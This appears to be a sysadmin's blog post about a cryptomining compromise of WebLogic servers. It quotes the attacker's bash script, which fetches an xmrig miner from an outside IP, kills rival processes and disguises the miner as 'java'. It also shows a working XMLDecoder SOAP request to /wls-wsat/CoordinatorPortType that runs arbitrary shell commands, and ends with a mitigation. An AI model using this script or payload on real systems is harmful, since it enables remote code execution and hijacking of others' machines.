# Weblogic Component Vulnerability /wls-wsat/CoordinatorPortType wls-wsat.war

It was the day after new year. In one morning all of our java instances has been killed. We first suspected there was a manual reboot. 
So we started our application server as usual. We first started our node managers. Then started our admin server and our java applications.
While we were working on these jobs, suddenly in one machine all of our java processes had been killed. We immediately informed our product owner saying that there could be a manual intervention somewhere else even if we could not find the logged in user. We also suspected that the ssh user had been compromised then changed the password with a relief.

After two hours everything went normally. Then the ultimate catastrophic event happened. Our java instances had been killed again. When we check the processes there were two java processes which eat up the cpu like a hungry pig. We decided not to kill these processes but examine them. When we inspect it with netstat we saw that they send packages to the following IP address.

```
http://145.239.0.84/
Mining Pool Online
```

We checked the history and could not believe our eyes.

```
#!/bin/bash
sPid=$$
mPid=''
mName='java'
checkCmd() {     command -v $1 >/dev/null 2>&1; }
downloader () {     if checkCmd wget; then         wget $1 -O $2 ;     elif checkCmd curl; then         curl $1 -o $2;     elif checkCmd python; then         if [ "`python -c "import sys; print(sys.version_info[0])"`" = "3" ]; then             python -c "from urllib.request import urlopen; u = urlopen('"$1"'); localFile = open('"$2"', 'wb'); localFile.write(u.read()); localFile.close()";         else             python -c "from urllib import urlopen; u = urlopen('"$1"'); localFile = open('"$2"', 'wb'); localFile.write(u.read()); localFile.close()";         fi;     else         cat < /dev/tcp/165.227.215.25/5555 > $2;     fi;     chmod +x $2; }
killer() {     for tmpVar in `ps -aeo pid,%cpu,command | sed 1d | sort -k 2 | tail -n 10 | awk '{print $1}'`; do         if [ $tmpVar = $sPid ]; then             continue;         fi;         if [ $tmpVar = $mPid ]; then             continue;         fi;         if [ `ps -o %cpu $tmpVar | sed 1d | sed 's/\..*//g'` -ge 60 ]; then             if [ `ps $tmpVar | sed 1d | awk '{print $5}' | grep java` ]; then                 continue;             fi;             if [ `ps $tmpVar | sed 1d | awk '{print $5}' | grep sh` ]; then                 continue;             fi;             if [ `ps $tmpVar | sed 1d | awk '{print $5}' | grep bash` ]; then                 continue;             fi;             kill -9 $tmpVar;             rm -f `ls -l /proc/$tmpVar/exe 2>&1 | sed 's/.*-> //g'`;         fi;     done; }
runer() {     if [ -z "$mPid" ]; then         if [ ! -f $mName ]; then             downloader http://165.227.215.25/xmrig-y $mName;         fi;         chmod +x ./$mName;         ./$mName;     fi;     mPid=`ps -eo pid,command | grep $mName | head -n 1 | awk '{print $1}'`; }
pkill python; pkill $mName
downloader http://165.227.215.25/xmrig-y $mName
```

Someone had been killed all of our processes except its process. Downloaded a modified executable named xmrig which was apparently a Monero (XMR) CPU miner. Started this executable and started mining XMR on our servers. The process was named as java and was sending data to the Mining Pool Online (http://145.239.0.84/)

We were shocked. After a couple of hours of blaming and panicking we discovered that it was a sneaky attack on our WebLogic servers.

There is a path in WebLogic server wls-wsat/CoordinatorPortType which can be used to execute any kind of soap request. So when I post this request.

```
POST your_host/wls-wsat/CoordinatorPortType HTTP 1.1

Host: host_name
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: wp-settings-time-1=1506773666
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">;;
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">;;
            <java version="1.8" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>ls -l >> a_random_file.txt |bash</string>
                        </void>
                    </array>
                    <void method="start" />
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body />
</soapenv:Envelope>

```

The soap request has been executed. The request mainly creates a ProcessBuilder object and executes it!!!
So only with a HTTP request, I can execute any command on the remote server!!!

We were actually happy when we discovered that. 

Our solution was to delete the responsible war. You can find it with the following command.

```
locate wls-wsat.war
```

Just delete it. Do not spend time for patching your useless weblogic server. 
Weblogic sucks!!!